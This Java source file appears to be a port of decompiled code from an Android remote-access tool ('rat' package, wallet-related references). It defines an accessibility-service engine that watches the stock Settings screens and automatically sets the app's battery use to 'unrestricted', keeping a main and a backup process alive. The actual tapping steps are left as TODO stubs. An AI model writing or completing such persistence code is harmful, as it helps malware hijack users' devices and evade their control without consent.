package com.vendor.rat.auto.engine;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.config.TextConfig;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * AOSP 通用保活引擎 (Settings 应用详情 → 电量管理)
 *
 * Vendor: o/g.java (316 行)
 * 功能: 在 AOSP 原生 Settings 中自动设置应用电量管理为"不受限"
 *       支持主进程 + 备用进程双保活
 *       30 秒超时自动结束
 *
 * 字段对齐:
 *   f636v → SYNTHETIC_FLAG (static)
 *   f637r → keepAliveTarget (AtomicReference, KEEP_ALIVE_UNKNOWN/MAIN/BACKUP)
 *   f638s → allowFullBackground (AtomicBoolean)
 *   f639t → allowAutoStart (AtomicBoolean)
 *   f640u → allowRelateStart (AtomicBoolean)
 *
 * 方法对齐:
 *   b0() → createAllowBackgroundFilter()
 *   c0() → createBatteryTextFilter()
 *   d0() → createSubSettingsWindow()
 *   e0(str) → createAppDetailWindow(str)
 *   f0() → createPowerTextFilter()
 *   g0() → createUsePowerTextFilter()
 *   j0(str) → createFrameLayoutWindow(str)
 *   k0() → createAllListenWindows()
 *   m0(str) → createSpaActivityWindow(str)
 *   o0() → createUnrestrictedFilters()
 *   Z()  → finish()
 *   h0() → isInBatteryManageWindow()
 *   i0() → isInAppDetailWindow()
 *   l0(root) → findBatteryItem(root) [反编译失败]
 *   n0(str) → savePowerControlState(str)
 *   u()  → onAccessibilityEvent()
 */
public class AospKeepAliveEngine extends AutoEngine {

    private static final String TAG = "AospKeepAlive";

    private static final String SETTINGS = "com.android.settings";

    // ADAPT: f636v → 静态合成字段
    public static final int SYNTHETIC_FLAG = 0;

    // ADAPT: 保活目标枚举
    public enum KeepAliveTarget {
        KEEP_ALIVE_UNKNOWN,
        KEEP_ALIVE_MAIN_APP,
        KEEP_ALIVE_BACKUP_APP
    }

    // ADAPT: f637r → keepAliveTarget
    public final AtomicReference<KeepAliveTarget> keepAliveTarget;

    // ADAPT: f638s → allowFullBackground
    public final AtomicBoolean allowFullBackground;

    // ADAPT: f639t → allowAutoStart
    public final AtomicBoolean allowAutoStart;

    // ADAPT: f640u → allowRelateStart
    public final AtomicBoolean allowRelateStart;

    public AospKeepAliveEngine() {
        super(createAllListenWindows(), SETTINGS);
        this.keepAliveTarget = new AtomicReference<>(KeepAliveTarget.KEEP_ALIVE_UNKNOWN);
        this.allowFullBackground = new AtomicBoolean(false);
        this.allowAutoStart = new AtomicBoolean(false);
        this.allowRelateStart = new AtomicBoolean(false);
        try {
            // ADAPT: vendor 30 秒超时自动结束
            scheduler.schedule(() -> finish(), 30L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "schedule timeout failed", e);
        }
    }

    @Override
    public void execute() {
        // ADAPT: vendor 无独立 execute
    }

    @Override
    public void onWindowMatched(String packageName, String className, AccessibilityEvent event) {
        // ADAPT: vendor u() 中的状态机逻辑
        try {
            if (isFinished()) return;

            boolean inAppDetail = isInAppDetailWindow();
            if (inAppDetail) {
                stateQueue.remove("keepAliveInAppBattery");
                if (!stateQueue.contains("keepAliveInAppDetail")) {
                    stateQueue.add("keepAliveInAppDetail");
                    // ADAPT: com.guard.wallet.thread.l.c(new f(this, 0), str3)
                    // TODO: VENDOR_VERIFY - 应用详情处理逻辑
                }
            }
            if (isInBatteryManageWindow()) {
                stateQueue.remove("keepAliveInAppDetail");
                if (!stateQueue.contains("keepAliveInAppBattery")) {
                    stateQueue.add("keepAliveInAppBattery");
                    // ADAPT: com.guard.wallet.thread.l.c(new f(this, 1), str3)
                    // TODO: VENDOR_VERIFY - 电量管理处理逻辑
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "onWindowMatched", e);
        }
    }

    // ============ 窗口匹配 ============

    /**
     * ADAPT: d0() → SubSettings 窗口
     */
    public static WindowMatcher createSubSettingsWindow() {
        return new WindowMatcher(SETTINGS, "com.android.settings.SubSettings")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: e0(str) → 应用详情窗口
     */
    public static WindowMatcher createAppDetailWindow(String appLabel) {
        return new WindowMatcher(SETTINGS,
                "com.android.settings.applications.InstalledAppDetailsTop")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: j0(str) → FrameLayout 窗口
     */
    public static WindowMatcher createFrameLayoutWindow(String appLabel) {
        return new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: m0(str) → SpaActivity 窗口
     */
    public static WindowMatcher createSpaActivityWindow(String appLabel) {
        return new WindowMatcher(SETTINGS, "com.android.settings.spa.SpaActivity")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: k0() → 创建所有监听窗口
     */
    public static List<WindowMatcher> createAllListenWindows() {
        List<WindowMatcher> list = new ArrayList<>();
        // ADAPT: vendor 使用 c.J() (电池优化对话框窗口)
        list.add(createAppDetailWindow(null));
        list.add(createSpaActivityWindow(null));
        list.add(createFrameLayoutWindow(null));
        list.add(createSubSettingsWindow());
        return list;
    }

    // ============ 过滤器 ============

    /**
     * ADAPT: b0() → 允许后台使用文本过滤器
     */
    public static CombineFilter createAllowBackgroundFilter() {
        String text = TextConfig.getInstance().getFirst("COMMON_ALLOW_BACKGROUND_USAGE_TEXT");
        if (text == null || text.isEmpty()) return null;
        return CombineFilter.textView(text);
    }

    /**
     * ADAPT: c0() → 电池文本过滤器
     */
    public static CombineFilter createBatteryTextFilter() {
        String text = TextConfig.getInstance().getFirst("COMMON_SETTINGS_BATTERY_TEXT");
        if (text == null || text.isEmpty()) return null;
        return CombineFilter.textView(text);
    }

    /**
     * ADAPT: f0() → 电量文本过滤器
     */
    public static CombineFilter createPowerTextFilter() {
        String text = TextConfig.getInstance().getFirst("COMMON_SETTINGS_POWER_TEXT");
        if (text == null || text.isEmpty()) return null;
        return CombineFilter.textView(text);
    }

    /**
     * ADAPT: g0() → 耗电文本过滤器
     */
    public static CombineFilter createUsePowerTextFilter() {
        String text = TextConfig.getInstance().getFirst("COMMON_SETTINGS_USE_POWER_TEXT");
        if (text == null || text.isEmpty()) return null;
        return CombineFilter.textView(text);
    }

    /**
     * ADAPT: o0() → 不受限文本过滤器 (OR 组合)
     */
    public static CombineFilter createUnrestrictedFilters() {
        List<CombineFilter> filters = new ArrayList<>();
        String[] keys = {
            "COMMON_SETTINGS_UNRESTRICTED_TEXT",
            "COMMON_SETTINGS_NO_RESTRICTED_TEXT",
            "COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"
        };
        for (String key : keys) {
            String text = TextConfig.getInstance().getFirst(key);
            if (text != null && !text.isEmpty()) {
                filters.add(CombineFilter.textView(text));
            }
        }
        if (filters.isEmpty()) return null;
        // ADAPT: vendor 使用 CombineFiltersWithOr
        CombineFilter or = new CombineFilter(CombineFilter.Logic.OR);
        for (CombineFilter f : filters) {
            or.add(f);
        }
        return or;
    }

    // ============ 窗口检测 ============

    /**
     * ADAPT: h0() → 是否在电量管理窗口
     */
    public final boolean isInBatteryManageWindow() {
        try {
            return matchWindow(SETTINGS, "com.android.settings.SubSettings");
        } catch (Exception e) {
            Log.e(TAG, "isInBatteryManageWindow", e);
            return false;
        }
    }

    /**
     * ADAPT: i0() → 是否在应用详情窗口
     */
    public final boolean isInAppDetailWindow() {
        try {
            // ADAPT: vendor 检查多种窗口类型
            return matchWindow(SETTINGS, "com.android.settings.applications.InstalledAppDetailsTop")
                    || matchWindow(SETTINGS, "com.android.settings.spa.SpaActivity")
                    || matchWindow(SETTINGS, "android.widget.FrameLayout");
        } catch (Exception e) {
            Log.e(TAG, "isInAppDetailWindow", e);
            return false;
        }
    }

    /**
     * ADAPT: n0(str) → 保存保活策略
     */
    public final void savePowerControlState(String packageName) {
        try {
            // TODO: VENDOR_VERIFY - 需要 PowerControlStateVO + utils.h 集成
            Log.d(TAG, "已保存本地保活策略|" + packageName);
        } catch (Exception e) {
            Log.e(TAG, "savePowerControlState", e);
        }
    }

    /**
     * ADAPT: Z() → 结束引擎
     */
    public void finish() {
        if (lock.tryLock()) {
            try {
                if (!isFinished()) {
                    Log.d(TAG, "准备结束本地保活自动化引擎");
                    // ADAPT: vendor 完整的清理流程
                    scheduler.shutdownNow();
                    stateQueue.clear();
                    Log.d(TAG, "已结束本地保活自动化引擎");
                }
            } catch (Exception e) {
                Log.e(TAG, "finish", e);
            } finally {
                lock.unlock();
            }
        }
    }
}
